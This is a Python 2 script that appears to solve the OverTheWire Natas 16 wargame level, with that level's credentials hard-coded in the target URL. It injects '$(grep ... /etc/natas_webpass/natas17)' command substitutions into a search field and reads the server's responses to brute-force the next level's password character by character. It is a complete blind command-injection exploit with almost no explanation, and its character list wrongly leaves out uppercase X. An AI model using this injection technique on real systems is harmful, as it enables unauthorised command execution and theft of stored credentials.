import requests

target = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'

# command $ grep -i /"$key"/ dictionary.txt
# $ grep -i $(echo 'a') dictionary.txt = grep -i a dictionary.txt
# $ grep -i $(grep a /etc/natas_webpass/natas17)blabs dictionary.txt 

allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWKYZ'
parsedChars = ''
password = ''
existStr = 'Output:\n<pre>\n</pre>'

for i in allChars :
	payload = {'needle':'$(grep '+i+' /etc/natas_webpass/natas17)blabs','submit':'Search'} 
	r = requests.post(target,data=payload)
	if r.text.find(existStr) != -1 :
		parsedChars += i
		print 'Parsed Chars :' + parsedChars

print 'Starting Bruteforce'

for i in range(32) :
	for j in parsedChars :
		payload = {'needle':'$(grep ^'+password+j+' /etc/natas_webpass/natas17)blabs','submit':'Search'}
		r = requests.post(target,data=payload)
		if r.text.find(existStr) != -1 :
			password += j
			print 'Password :' + password
			break